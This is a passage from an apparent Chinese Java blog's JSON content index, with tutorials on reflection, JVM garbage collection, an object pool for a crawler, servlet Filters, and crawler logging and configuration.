Modifier.isFinal(modifier);// ... 获取成员的变量名 : field#getName() 获取成员对应的value: field#get(instance) 对于静态成员，instance可以为null 对于非静态成员，instance必须为一个实例对象 获取注解: field#getAnnotations() 这个就厉害了，hibernate的校验框架，在成员变量上加一个注解Max,就可以设置参数的最大值，其实就是通过反射获取到注解，然后进行相应的逻辑 4. 获取方法获取方法，同上面的差不多，也有四种方式 1234567891011// 根据方法名，参数类型获取公共方法Method getMethod(String name, Class[] params)// 获取所有的公共方法Method[] getMethods()// 根据方法名，参数类型，获取声明的方法（包括私有）Method getDeclaredMethod(String name, Class[] params)// 获取所有声明的方法Method[] getDeclaredMethods() 返回了一个Method类，那么这个东西又有一些什么功能？ 获取方法名 Method#getName() 获取方法所在的类 : Method#getDeclaringClass() 获取方法返回类型 : Method#getReturnType() 获取方法上的注解 : Method#getAnnotations() 执行方法 有了这个就可以做很多事情了，实例中给出说明 1234// 设置方法可访问（即私有方法也可以被调用）method.setAccessible(true);// instance为实例对象， args为传入参数method.invoke(instance, args) III. 实例DEMO通过反射的方式，实现一个 BeanUtils，实现Bean的拷贝 当一个Bean有较多的成员变量时，如果我们采用最原始的setXXX()来一次赋值的时候，一是实现比较繁琐，其次就是当Bean的字段发生变动之后，也需要同步的修改，那么我们借助反射的方式，实现一个优雅的 BeanUtils 工具类 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849public class BeanUtils { public static void copy(Object source, Object dest) throws Exception { Class destClz = dest.getClass(); // 获取目标的所有成员 Field[] destFields = destClz.getDeclaredFields(); Object value; for (Field field : destFields) { // 遍历所有的成员，并赋值 // 获取value值 value = getVal(field.getName(), source); field.setAccessible(true); field.set(dest, value); } } private static Object getVal(String name, Object obj) throws Exception { try { // 优先获取obj中同名的成员变量 Field field = obj.getClass().getField(name); field.setAccessible(true); return field.get(obj); } catch (NoSuchFieldException e) { // 表示没有同名的变量 } // 获取对应的 getXxx() 或者 isXxx() 方法 name = name.substring(0, 1).toUpperCase() + name.substring(1); String methodName = \"get\" + name; String methodName2 = \"is\" + name; Method[] methods = obj.getClass().getMethods(); for (Method method : methods) { // 只获取无参的方法 if (method.getParameterCount() &gt; 0) { continue; } if (method.getName().equals(methodName) || method.getName().equals(methodName2)) { return method.invoke(obj); } } // 没有匹配到，这里返回null实际上是不合适的 // 因为如果原属性为基本数据类型，赋值null为报错 throw new Exception(); }} IV. 小结反射的四种用途 创建一个 RefectTest 对象 123456// 若有默认构造方法RefectTest instance = clz.newIntance();// 若需要传参数Constructor con = clz.getConstructor(int.class, boolean.class, RefectTest.class);RefectTest instance2 = con.newInstance(10, true, new RefectTest()); 判断父类是否是 MyRefect 12// 判断MyRefect是否为clz的父类boolean ans = MyRefect.class.isAssignableFrom(clz); 获取所有的成员变量 12// 获取所有的成员变量（包括私有的）Field[] fields = clz.getDeclaredFields(); 获取所有的方法 12// 获取所有的成员方法（包括私有方法）Method[] methods = clz.getDeclaredMethods(); 使用注意事项 操作私有变量，私有方法时，先设置field.setAccessible(true);确保可访问 反射会带来额外的性能开销 可以用 Class#isAssignableFrom() 来判断类继承关系 可以用 Class#isPrimitive()判断是否为基本数据类型 可以用 Class#getGenericSuperclass() 获取泛型类型 V. 其他声明尽信书则不如，已上内容，纯属一家之言，因本人能力一般，见解不全，如有问题，欢迎批评指正 扫描关注，java分享","link":"/hexblog/2017/12/29/JDK学习之反射的使用姿势一览/"},{"title":"JVM学习之垃圾回收机制","text":"jvm的垃圾回收算法，除了我们熟悉的引用计数判断对象是否活着之外，其他还有那些有意思的东西呢？ 总是听到的年轻代年老代又是啥？ 传说中的YoungGC(MinorGC) 和 FullGC的时机是什么，又干了些啥？ I. 对象存活判断垃圾回收，回收的都是那些不在使用的对象（也就是没有存活的对象），因此怎么判断对象是否存活，就显得比较重要了 对这个映像最深刻的就是引用计数方式，一个对象被使用了，计数就+1；不用了，技术就-1；当计数为0的时候，就表示对象没人用了，简单粗暴，然而实际的情况中，大都不用这个方式，因为无法解决对象相互循环引用的问题 目前更多的是采用gc root可达性分析，简单来讲就是从一个根节点往下走，走的轨迹上所有的对象，都表示是存活的；也就是说，所有游离在这个之外的对象，都是需要回收的 那么什么是GC ROOT呢 ？ 虚拟机栈内引用的对象 方法区静态属性引用的对象 方法区常量引用的对象 本地方法栈中JNI引用的对象 II. 垃圾回收算法回收，主要指的是将堆和运行时方法区内没有存活的对象干掉；而通常我们所说的垃圾回收，则主要针对的就是堆内的回收 1. 标记-清除算法简单理解：根据可达性扫一遍，有用的对象打个标记；剩下来一次大清理，将没有标记的都ko掉 说明 看书和博文时，常感觉标记，是将需要回收的对象标记出来，但仔细想了下，从实现成本来讲，根据可达性分析对象是否存活，顺带的直接将存活的打个标记，比将所有没存活的上面打上标记要来的简单，而且这也能算是标记出需要回收的对象 缺点 缺点很明显，会出现大量的碎片空间 2. 复制算法将存储空间一分为二，每次回收就是将这一边的存活对象搬移到另一边 缺点 空间少了一半 对于存活时间比较久的对象，需要频繁的来回搬迁 3. 标记-压缩算法（或标记-整理算法）为了节省空间，这个的策略是将所有存活的对象，往某一边界进行复制，等复制完毕之后，将辩解之外的对象都ko掉 4. 分代收集算法分代收集，实际来说就是综合其他算法的优良特性，结合实际应用场景来处理 将存活时间久，占用空间大的对象，放在老年代 其他的对象可以放在年轻代 也就是说： 老年代中，基本上是老而弥坚的对象，更加适合标记-整理算法，移到一边之后，由于经常活着，也就避免了频繁的复制了 新生代中，常是一些朝生夕死的对象，可能用了一次就可以ko，因此可以采用复制算法，标记-清除也是ok的 分代的主要思想就是根据不同的情况，给予不同的策略 III. 简单说下垃圾收集器收集算法是内存回收的方法论，垃圾收集器就是内存回收的具体实现 1. Serial收集串行收集器，也就是程序跑一会，停下，让我们的回收线程（只有一个）来实现垃圾回收 新生代、老年代使用串行回收；新生代复制算法、老年代标记-压缩 2. ParNew收集上面的多线程版本 新生代并行，老年代串行；新生代复制算法、老年代标记-压缩 3. Parallel收集类似ParNew收集器，Parallel收集器更关注系统的吞吐量。可以通过参数来打开自适应调节策略，虚拟机会根据当前系统的运行情况收集性能监控信息，动态调整这些参数以提供最合适的停顿时间或最大的吞吐量；也可以通过参数控制GC的时间不大于多少毫秒或者比例； 新生代复制算法、老年代标记-压缩 4. Parallel Old 收集器Parallel Old是Parallel Scavenge收集器的老年代版本，使用多线程和“标记－整理”算法。这个收集器是在JDK 1.6中才开始提供 5. CMS收集器这个是比较常用的，有必要好好了解下 Concurrent Mark Sweep 收集器，是一种以获取最短回收停顿时间为目标的收集器，核心就是标记-清除算法 a 步骤 初始标记：标记GC Roots能直接关联到的对象，速度很快，会暂停 并发标记：进行 GC Roots Tracing的过程 重新标记：为了修正并发标记期间，因为程序继续运作导致标记变动的那一部分对象的标记记录，一般会长于初始标记时间，远小于并发标记的时间 并发清除：并发干掉被回收的问题 初始标记和重新标记的时候，会暂停服务；后面两个则是并发修改 b. 优缺点优点：并发收集、低停顿 缺点：产生大量空间碎片、并发阶段会降低吞吐量 6. G1收集器传说中是最先进的收集器。。。。 用G1收集器时，Java堆的内存布局与其他收集器有很大差别，它将整个Java堆划分为多个大小相等的独立区域（Region），虽然还保留有新生代和老年代的概念，但新生代和老年代不再是物理隔阂了，它们都是一部分（可以不连续）Region的集合 a. 步骤 标记阶段：初始标记，会停顿，触发minorgc Root Region Scanning: 程序运行过程中会回收survivor区(存活到老年代)，这一过程必须在minorGC之前完成 并发标记：若发现区域对象中的所有对象都是垃圾，那个这个区域会被立即回收(图中打X)。同时，并发标记过程中，会计算每个区域的对象活性(区域中存活对象的比例)；并发执行，可能被minorgc打断 再标记：再标记阶段是用来收集 并发标记阶段 产生新的垃圾(并发阶段和应用程序一同运行)，停顿 复制-整理：并发干掉死亡对象，G1将回收区域的存活对象拷贝到新区域 IV. GC分析这个日志主要针对的是CMS收集器的分析，因为我接触的应用，服务器上就是选择的这个… 看一张神奇的图 内存分配和回收策略a. 对象优先在Eden分配大多数场景下，对象在新生代Eden区分配，当Eden去没有足够的空间进行分配时，虚拟机发起一次 Minor GC 新生代MinorGC ： 发生在新生代的垃圾收集动作，因为java对象大多都具备朝生夕灭的特性是，所以一般MinorGC非常频繁，一般回收速度也很快 老年代MajorGC(FullGC) : 发生在老年代的GC，通常就伴随至少一次的MinorGC（非绝对），一般较慢，是MinorGC的十倍以上 b. 大对象直接进入老年代需要大量连续内存空间的Java对象，通常是数组，同构 -XX:PretenuresizeThreshold 参数，来设置大对象的阀值，超过这个阀值的直接分配在年老代，避免在Eden区及两个Survivor区之间发生大量的内存复制 c. 长期存活的对象将进入老年代既然虚拟机采用分代收集的思想来管理内存，在回收时，就必须能识别哪些对象应放在新生代，那些对象应放在老年代中 每个对象都有个Age的计数器，对象在Eden出生并经过第一次MinorGC后仍存在，且可以被Survivor容纳的话，会被移动到Survivor空间中，并设置Age为1 对象在Survivor区没多经过一次MinorGC，则age+1 当age超过阀值（默认15），就会晋升到老年代 阀值可以通过 -XX:MaxTenuringThreshold来设置 d. 动态对象年龄判定如果在Survivor空间中相同年龄所有对象的大小的总和，大于Survivor空间的一半，则年龄大于或等于该年龄的对象就可以进入老年代，无需等Age达到阈值 e. 空间分配担保在发生MinorGC之前，虚拟机会先检查老年代最大可用的连续空间是否大于新生代所有对象总空间，如果成立，则Minor GC可以确保总是安全的； 否则，查看 HandlePromotionFailure参数，是否允许担保失败 若允许，则继续检查老年代最大可用的连续空间是否大于历次晋升到老年代对象的平均大小，若大于，则尝试MinorGC 否则进行FullGC V. 小结1. 怎么判断对象是否存活两种方式，引用计数和可达性分析 引用计数: 循环依赖问题，没啥用 可达性：从gc roots出发，可达的都是存活的 2. 几种回收算法对比 算法 简述 缺点 标记-清除 标记对象，统一清楚可回收对象 大量碎片 复制算法 内存一分为二，将存活的移动到另一边 存活久的对象，频繁复制；空间变小 标记-整理 存活对象往一边界拷贝，边界外的都干掉 对于生命周期特别短的不太合适 分代 年轻代 + 年老代，不同代选用不同算法 - 3. CMS和G1阶段对比cms主要区分四个步骤： 标记：停顿 并发标记 重新标记：停顿，重新处理并发过程中新标记的对象 并发清除：并发回收 g1，从结构上而言，划分为一个个独立区域(region)，采用标记-整理算法，避免碎皮空间 4. 简述内存分配和回收基于CMS进行说明 优先分配edge区（不够则触发gc） 大对象，分配在old区 存活时间久的塞入old区 动态时间判断（某个age对象总和大于Survivor一半，则塞入old区） 分配担保（进入old区，但是old区空间不够的策略，决定是否触发gc） VI. 其他参考 jvm系列(三):java GC算法 垃圾收集器 JVM调优工具介绍 个人博客： Z+|blog基于hexo + github pages搭建的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 声明尽信书则不如，已上内容，纯属一家之言，因本人能力一般，见识有限，如发现bug或者有更好的建议，随时欢迎批评指正 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 扫描关注","link":"/hexblog/2018/03/15/JVM学习之垃圾回收机制/"},{"title":"Java 动手写爬虫: 五 对象池","text":"第五篇，对象池的设计与实现 前面每爬取一个任务都对应一个Job任务，试想一下，当我们爬取网页越来越多，速度越来越快时，就会出现频繁的Job对象的创建和销毁，因此本片将考虑如何实现对象的复用，减少频繁的gc 设计我们的目标是设计一个对象池，用于创建Job任务，基本要求是满足下面几点: 可以配置对象池的容量大小 通过对象池获取对象时，遵循一下规则： 对象池中有对象时，总对象池中获取 对象池中没有可用对象时，新创建对象返回（也可以采用阻塞，直到有可用对象，我们这里采用直接创建新对象方式） 对象用完后扔回对象池 实现1. 创建对象的工厂类 ObjectFactory对象池在初始化对象时，借用对象工厂类来创建，实现解耦 12345public interface ObjectFactory&lt;T&gt; { T create();} 2. 对象池中的对象接口 IPollCell因为每个对象都拥有自己的作用域，内部包含一些成员变量，如果对象重用时，这些成员变量的值，可能会造成影响，因此我们定义 IPoolCell 接口，其中声明一个方法，用于重置所有的变量信息 12345678public interface IPoolCell { /** * 清空所有状态 */ void clear();} 3. 一个简单的对象池 SimplePool123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899package com.quick.hui.crawler.core.pool;import lombok.extern.slf4j.Slf4j;import java.util.concurrent.BlockingQueue;import java.util.concurrent.LinkedBlockingQueue;import java.util.concurrent.atomic.AtomicInteger;/** * Created by yihui on 2017/8/6. */@Slf4jpublic class SimplePool&lt;T extends IPoolCell&gt; { private static SimplePool instance; public static void initInstance(SimplePool simplePool) { instance = simplePool; } public static SimplePool getInstance() { return instance; } private int size; private BlockingQueue&lt;T&gt; queue; private String name; private ObjectFactory objectFactory; private AtomicInteger objCreateCount = new AtomicInteger(0); public SimplePool(int size, ObjectFactory objectFactory) { this(size, \"default-pool\", objectFactory); } public SimplePool(int size, String name, ObjectFactory objectFactory) { this.size = size; this.name = name; this.objectFactory = objectFactory; queue = new LinkedBlockingQueue&lt;&gt;(size); } /** * 获取对象，若队列中存在， 则直接返回；若不存在，则新创建一个返回 * @return */ public T get() { T obj = queue.poll(); if (obj != null) { return obj; } obj = (T) objectFactory.create(); int num = objCreateCount.addAndGet(1); if (log.isDebugEnabled()) { if (objCreateCount.get() &gt;= size) { log.debug(\"objectPoll fulled! create a new object! total create num: {}, poll size: {}\", num, queue.size()); } else { // fixme 由于并发问题，这个队列的大小实际上与添加对象时的大小不一定相同 log.debug(\"objectPoll not fulled!, init object, now poll size: {}\", queue.size()); } } return obj; } /** * 将对象扔回到队列中 * * @param obj */ public void release(T obj) { obj.clear(); // 非阻塞方式的扔进队列 boolean ans = queue.offer(obj); if (log.isDebugEnabled()) { log.debug(\"return obj to pool status: {}, now size: {}\", ans, queue.size()); } } public void clear() { queue.clear(); }} 上面的方法中，主要看get和release方法，简单说明 get 方法 首先是从队列中获取对象（非阻塞方式，获取不到时返回null而不是异常） 队列为空时，新建一个对象返回 未初始化队列，创建的对象表示可回收重复使用的 队列填满了，但是被其他线程获取完了，此时创建的对象理论上不需要重复使用，用完一次就丢掉 release 方法 清空对象状态 扔进队列（非阻塞） 4. Job修改 既然要使用对象池，那么我们的IJob对象需要实现 IPoolCell接口了 将实现放在 DefaultAbstractCrawlJob 类中 1234567@Overridepublic void clear() { this.depth = 0; this.crawlMeta = null; this.fetchQueue = null; this.crawlResult = null;} 使用 上面只是实现了一个最简单的最基础的对象池，接下来就是适配我们的爬虫系统了 之前的创建Job任务是在 com.quick.hui.crawler.core.fetcher.Fetcher#start 中直接根据传入的class对象来创建对象，因此，第一步就是着手改Fetcher类 1. 初始化对象池创建方法修改，新增对象池对象初始化：Fetcher.java 12345678910111213141516171819202122232425public &lt;T extends DefaultAbstractCrawlJob&gt; Fetcher(Class&lt;T&gt; jobClz) { this(0, jobClz);}public &lt;T extends DefaultAbstractCrawlJob&gt; Fetcher(int maxDepth, Class&lt;T&gt; jobClz) { this(maxDepth, () -&gt; { try { return jobClz.newInstance(); } catch (Exception e) { log.error(\"create job error! e: {}\", e); return null; } });}public &lt;T extends DefaultAbstractCrawlJob&gt; Fetcher(int maxDepth, ObjectFactory&lt;T&gt; jobFactory) { this.maxDepth = maxDepth; fetchQueue = FetchQueue.DEFAULT_INSTANCE; threadConf = ThreadConf.DEFAULT_CONF; initExecutor(); SimplePool simplePool = new SimplePool&lt;&gt;(ConfigWrapper.getInstance().getConfig().getFetchQueueSize(), jobFactory); SimplePool.initInstance(simplePool);} 说明 为什么将创建的对象池座位 SimplePool的静态变量 ? 因为每个任务都是异步执行，在任务执行完之后扔回队列，这个过程不在 Fetcher对象中执行，为了共享对象池，采用了这种猥琐的方法 2. 启动方法修改在创建 Fetcher 对象时，已经初始化好对象池，因此start方法不需要接收参数，直接改为 1234567891011public &lt;T extends DefaultAbstractCrawlJob&gt; void start() throws Exception { .... DefaultAbstractCrawlJob job = (DefaultAbstractCrawlJob) SimplePool.getInstance().get(); job.setDepth(this.maxDepth); job.setCrawlMeta(crawlMeta); job.setFetchQueue(fetchQueue); executor.execute(job); ... 测试测试代码与之前有一点区别，即 Fetcher 在创建时选择具体的Job对象类型，其他的没啥区别 12345678910111213141516171819202122232425262728public static class QueueCrawlerJob extends DefaultAbstractCrawlJob { public void beforeRun() { // 设置返回的网页编码 super.setResponseCode(\"gbk\"); } @Override protected void visit(CrawlResult crawlResult) {// System.out.println(Thread.currentThread().getName() + \"___\" + crawlMeta.getCurrentDepth() + \"___\" + crawlResult.getUrl()); }}@Testpublic void testCrawel() throws Exception { Fetcher fetcher = new Fetcher(2, QueueCrawlerJob.class); String url = \"http://chengyu.911cha.com/zishu_4.html\"; CrawlMeta crawlMeta = new CrawlMeta(); crawlMeta.setUrl(url); crawlMeta.addPositiveRegex(\"http://chengyu.911cha.com/zishu_4_p[0-9]+\\\\.html$\"); fetcher.addFeed(crawlMeta); fetcher.start();} 待改进上面只是实现了一个最基本简单的对象池，有不少可以改进的地方 对象池实例的维护，上面是采用静态变量方式，局限太强，导致这个对象池无法多个共存 对象池大小没法动态配置，初始化时设置好了之后就没法改 可考虑新增阻塞方式的获取对象 以上坑留待后续有空进行修改 3. 源码地址项目地址： https://github.com/liuyueyi/quick-crawler 对象池对应的tag: v0.008 相关博文Quick-Crawel爬虫系列博文 参考 一个通用并发对象池的实现 II. 其他一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 扫描关注","link":"/hexblog/2017/08/06/Java-动手写爬虫-五-对象池/"},{"title":" JavaWeb三大组件之Filter学习详解","text":"JavaWeb三大组件之Filter学习详解 Filter基本上可以说存在所有的JavaWeb项目中，比如最基本的一个请求参数的编码CharacterEncodingFilter，大家一般都会配置下，那么filter是干嘛的呢？ 本篇将主要集中在fitler的以下几个知识点: 干嘛的 怎么用 多个Filter执行的先后顺序 注意事项 I. 基本知识Filter称之为过滤器，是用来做一些拦截的任务， 在Servlet接受请求之前，做一些事情，如果不满足限定，可以拒绝进入Servlet 从上面的图，可以看出一个Filter的工作流程: 一个http请求过来之后 首先进入filter，执行相关业务逻辑 若判定通行，则进入Servlet逻辑，Servlet执行完毕之后，又返回Filter，最后在返回给请求方 判定失败，直接返回，不需要将请求发给Servlet 通过上面的流程，可以推算使用场景： 在filter层，来获取用户的身份 可以考虑在filter层做一些常规的校验（如参数校验，referer校验等） 可以在filter层做稳定性相关的工作（如全链路打点，可以在filter层分配一个traceId；也可以在这一层做限流等） 1. 基本使用姿势要使用一个Filter，一半需要两步，实现Filter接口的自定义类，web.xml中对filter的定义 1234567891011public interface Filter { public void init(FilterConfig filterConfig) throws ServletException; public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException; public void destroy();} 主要就三个方法，从命名来看， 也比较清晰，在创建Filter对象的时候，调用 init 方法 销毁Filter对象的时候，调用 destroy 方法 当请求过来之后，调用 doFilter，也就是主要的业务逻辑所在了 详细case后面再说 接下来就是xml的配置了，和Servlet类似，每自定义一个，都需要在xml中加上一个配置（挺繁琐的操作的） 123456789101112131415161718&lt;!-- 解决乱码的问题 --&gt;&lt;filter&gt; &lt;filter-name&gt;encodingFilter&lt;/filter-name&gt; &lt;filter-class&gt;org.springframework.web.filter.CharacterEncodingFilter&lt;/filter-class&gt; &lt;async-supported&gt;true&lt;/async-supported&gt; &lt;init-param&gt; &lt;param-name&gt;encoding&lt;/param-name&gt; &lt;param-value&gt;UTF-8&lt;/param-value&gt; &lt;/init-param&gt; &lt;init-param&gt; &lt;param-name&gt;forceEncoding&lt;/param-name&gt; &lt;param-value&gt;true&lt;/param-value&gt; &lt;/init-param&gt;&lt;/filter&gt;&lt;filter-mapping&gt; &lt;filter-name&gt;encodingFilter&lt;/filter-name&gt; &lt;url-pattern&gt;/*&lt;/url-pattern&gt;&lt;/filter-mapping&gt; 配置也比较简单了，一个 一个 前者定义具体的Filter，后者表示这个Filter拦截的URL （看起来和Servlet的配置规则没什么两样） II. 实例我们的实例，就拿大名鼎鼎的CharacterEncodingFilter来说明，顺带膜拜下Spring的大神的优秀源码 123456789101112131415161718192021222324252627282930313233343536373839404142public class CharacterEncodingFilter extends OncePerRequestFilter { private String encoding; private boolean forceEncoding = false; public CharacterEncodingFilter() { } public CharacterEncodingFilter(String encoding) { this(encoding, false); } public CharacterEncodingFilter(String encoding, boolean forceEncoding) { Assert.hasLength(encoding, \"Encoding must not be empty\"); this.encoding = encoding; this.forceEncoding = forceEncoding; } public void setEncoding(String encoding) { this.encoding = encoding; } public void setForceEncoding(boolean forceEncoding) { this.forceEncoding = forceEncoding; } @Override protected void doFilterInternal( HttpServletRequest request, HttpServletResponse response, FilterChain filterChain) throws ServletException, IOException { if (this.encoding != null &amp;&amp; (this.forceEncoding || request.getCharacterEncoding() == null)) { request.setCharacterEncoding(this.encoding); if (this.forceEncoding) { response.setCharacterEncoding(this.encoding); } } filterChain.doFilter(request, response); System.out.printl(\"servelt 执行完成，又返回filter\"); }} 上面的实现比较简单，主要将视线集中在 doFilterInternal 方法内部，如果要设置编码参数，则直接修改 HttpServletRequest, HttpServletResponse 两个参数，操作完成之后，执行下面这一行 1filterChain.doFilter(request, response); 注意 上面这一行执行，表示Filter层已经通过了，请求可以转发给下一个Filter或者直接传给Servlet 而下一个Filter, Servlet执行完成之后，还会继续往下走，就是上面的那一行输出，也会被调用（那一行是我加的，源码中没有） 所以，如果你不希望继续往下走，那么就简单了，不执行上面的那一行即可 疑问问题一：看了上面的源码，一个很明显的问题就是，参数怎么设置的？ 仔细看上面的源码，发现自定义Filter是继承 org.springframework.web.filter.OncePerRequestFilter 而不是直接实现的 Filter 接口，而且方法内也没有显示的实现 init()方法，所有很容易猜到是父类中实现了参数的初始化过程 具体的实现逻辑是在 org.springframework.web.filter.GenericFilterBean#init 中，同样是Spring实现的，主要代码捞出来 12345678910111213141516171819202122232425262728293031public final void init(FilterConfig filterConfig) throws ServletException { Assert.notNull(filterConfig, \"FilterConfig must not be null\"); if (logger.isDebugEnabled()) { logger.debug(\"Initializing filter '\" + filterConfig.getFilterName() + \"'\"); } this.filterConfig = filterConfig; // Set bean properties from init parameters. try { PropertyValues pvs = new FilterConfigPropertyValues(filterConfig, this.requiredProperties); BeanWrapper bw = PropertyAccessorFactory.forBeanPropertyAccess(this); ResourceLoader resourceLoader = new ServletContextResourceLoader(filterConfig.getServletContext()); bw.registerCustomEditor(Resource.class, new ResourceEditor(resourceLoader, this.environment)); initBeanWrapper(bw); bw.setPropertyValues(pvs, true); } catch (BeansException ex) { String msg = \"Failed to set bean properties on filter '\" + filterConfig.getFilterName() + \"': \" + ex.getMessage(); logger.error(msg, ex); throw new NestedServletException(msg, ex); } // Let subclasses do whatever initialization they like. initFilterBean(); if (logger.isDebugEnabled()) { logger.debug(\"Filter '\" + filterConfig.getFilterName() + \"' configured successfully\"); }} 看上面一大串的代码，到底干了嘛？ 简单来讲，就是获取xml中配置的参数，然后填充到Filter对象中（对Srping而言，CharacterEncodingFilter就是一个bean），这个具体的逻辑和本篇关系不大，就直接跳过了 问题二：在Filter层中可以获取参数么 从doFilter的方法签名中看，既然有Request参数，那么应该是可以获取到请求参数的，那么实际验证一下 先实现一个最最最简单的Filter 123456789101112131415161718public class TestFilter implements Filter { @Override public void init(FilterConfig filterConfig) throws ServletException { } @Override public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException { System.out.println(\"in filter\"); System.out.println(\"args: \" + JSON.toJSONString(request.getParameterMap())); chain.doFilter(request, response); System.out.println(\"out filter\"); } @Override public void destroy() { }} 开始测试 1curl -d 'name=Hello&amp;password=world' http://127.0.0.1:8088/123 输出如下 123in filterargs: {\"name\":[\"Hello\"],\"password\":[\"world\"]}out filter 注意 在Filter中获取参数时，最好不要直接使用获取请求流的方式，如果获取请求流，那么Servlet就获取不到请求参数了 问题三：多个filter的顺序怎么定 前面学习Servlet的时候，也有这个问题，一个URL被多个Servlet命中了，那么先后顺序是怎样的呢？ 精确匹配 &gt; 最长匹配 &gt; 其他模糊匹配 &gt; 没有匹配的则是404 那么Filter呢，他们的区别还是比较明显的，很多Filter都是拦截所有的请求，即很多Filter的命中规则都是一样的，那么怎么办？ 先执行带有url-pattern标签的filter，再执行带有servlet-name标签的filter 如果同为url-pattern或servlet-name，则会按照在web.xml中的声明顺序执行 测试case如下，我们定义三个Filter： TestFilter: 匹配所有路径 ATestFilter: 匹配所有路径 ServletFilter: 匹配 mvc-servlet 123456789101112131415161718192021// ATestFilter@Overridepublic void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException { System.out.println(\"in ATestFilter\"); chain.doFilter(request, response);}// TestFilter@Overridepublic void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException { System.out.println(\"in TestFilter\"); chain.doFilter(request, response);}// ServletFilter@Overridepublic void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException { System.out.println(\"in ServletFilter\"); chain.doFilter(request, response);} 对应的xml配置如下 123456789101112131415161718192021222324252627282930&lt;filter&gt; &lt;filter-name&gt;servletFilter&lt;/filter-name&gt; &lt;filter-class&gt;com.test.ServletFilter&lt;/filter-class&gt; &lt;async-supported&gt;true&lt;/async-supported&gt;&lt;/filter&gt;&lt;filter-mapping&gt; &lt;filter-name&gt;servletFilter&lt;/filter-name&gt; &lt;servlet-name&gt;mvc-dispatcher&lt;/servlet-name&gt;&lt;/filter-mapping&gt;&lt;filter&gt; &lt;filter-name&gt;testFilter&lt;/filter-name&gt; &lt;filter-class&gt;com.test.TestFilter&lt;/filter-class&gt; &lt;async-supported&gt;true&lt;/async-supported&gt;&lt;/filter&gt;&lt;filter-mapping&gt; &lt;filter-name&gt;testFilter&lt;/filter-name&gt; &lt;url-pattern&gt;/*&lt;/url-pattern&gt;&lt;/filter-mapping&gt;&lt;filter&gt; &lt;filter-name&gt;atestFilter&lt;/filter-name&gt; &lt;filter-class&gt;com.test.ATestFilter&lt;/filter-class&gt; &lt;async-supported&gt;true&lt;/async-supported&gt;&lt;/filter&gt;&lt;filter-mapping&gt; &lt;filter-name&gt;atestFilter&lt;/filter-name&gt; &lt;url-pattern&gt;/*&lt;/url-pattern&gt;&lt;/filter-mapping&gt; 输出结果 123in TestFilterin ATestFilterin ServletFilter III. 小结Filter 通常用于JavaWeb的过滤使用，通过doFilter方法中执行 chain.doFilter(request, response);，进入下一个Filter或者Servlet执行逻辑，当执行完成之后，依然会回到Filter这一层，继续走下去 针对上面的逻辑，Filter的常见应用场景有： 用户信息获取，身份校验 安全校验（referer校验失败，直接拒绝） 稳定性相关（限流，监控埋点，全链路日志埋点） Filter的执行顺序： url-mapping 的优先执行，其次是 servlet-mapping 同一个匹配方式（如都是url-mapping）中，根据在xml中定义的先后顺序来确定 Filter的注意事项： 正常业务，请记得一定执行 chain.doFilter(request, response)， 最后把它放在finnal块中，防止你在Filter中的代码抛异常导致进入不到后续的逻辑 在Filter中不要直接获取请求数据流（请求流被读取完之后，Servlet就get不到了!） IV. 其他声明尽信书则不如，已上内容，纯属一家之言，因本人能力一般，见解不全，如有问题，欢迎批评指正 扫描关注，java分享","link":"/hexblog/2018/01/26/JavaWeb三大组件之Filter学习详解/"},{"title":"Java 动手写爬虫: 四、日志埋点输出 & 动态配置支持","text":"第四篇, 日志埋点输出 &amp; 动态配置支持 前面基本上实现了一个非常简陋的爬虫框架模型，很多关键链路都没有日志，在分析问题时，就比较麻烦了，因此就有了这一篇博文 其次就是解决前几篇遗留的容易解决的问题 实际上，日志的输出应该贯穿在实际的开发过程中的，由于之前写得比较随意，直接System.out了, 所以现在就来填坑了 1.日志埋点设计采用 logback 左右日志输出， 这里有一篇博文可供参考 《Logback 简明使用手册》 埋点的关键链路 当前爬取的任务信息 爬取任务的耗时 应用的状态（如爬取了多少个，还剩下多少个待爬取等） 爬取结果输出 其他一些信息 实现比较简单，在pom中添加依赖 1234567891011&lt;!--日志--&gt;&lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;artifactId&gt;slf4j-api&lt;/artifactId&gt; &lt;version&gt;1.7.21&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;ch.qos.logback&lt;/groupId&gt; &lt;artifactId&gt;logback-classic&lt;/artifactId&gt; &lt;version&gt;1.1.7&lt;/version&gt;&lt;/dependency&gt; 添加配置文件 logback-test.xml 12345678910111213141516&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;configuration&gt; &lt;appender name=\"STDOUT\" class=\"ch.qos.logback.core.ConsoleAppender\"&gt; &lt;encoder&gt; &lt;pattern&gt;%-4relative [%thread] %-5level %logger{35} - %msg %n&lt;/pattern&gt; &lt;/encoder&gt; &lt;/appender&gt; &lt;logger name=\"com.quick.hui.crawler\" level=\"DEBUG\"/&gt; &lt;root level=\"INFO\"&gt; &lt;appender-ref ref=\"STDOUT\"/&gt; &lt;/root&gt;&lt;/configuration&gt; 代码中埋点 …. （直接参考源码即可） 2. 爬取频率控制 很多网站会对访问的频率进行限制，这是一个最基础的防爬手段了，所以我们的爬取需要一个可以设置爬取任务的频率控制 1. 设计目的 采用一个比较简单的方案，每次从队列中获取爬取任务时，sleep指定的时间，来实现爬取频率的限制 对此我们设计得稍微高级一点，这个sleep时间，我们希望是可以动态配置的 方案 采用配置项来解决这个，（为了后续的拓展，读取配置搞成面向接口的编程方式），我们先提供一个基础的，根据本地配置文件来读取频率控制参数 实现 因为采用配置文件的方式，所以一个用于读取配置文件的辅助工具类是必须的 1. 配置文件读取 FileConfRead123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354@Slf4jpublic class 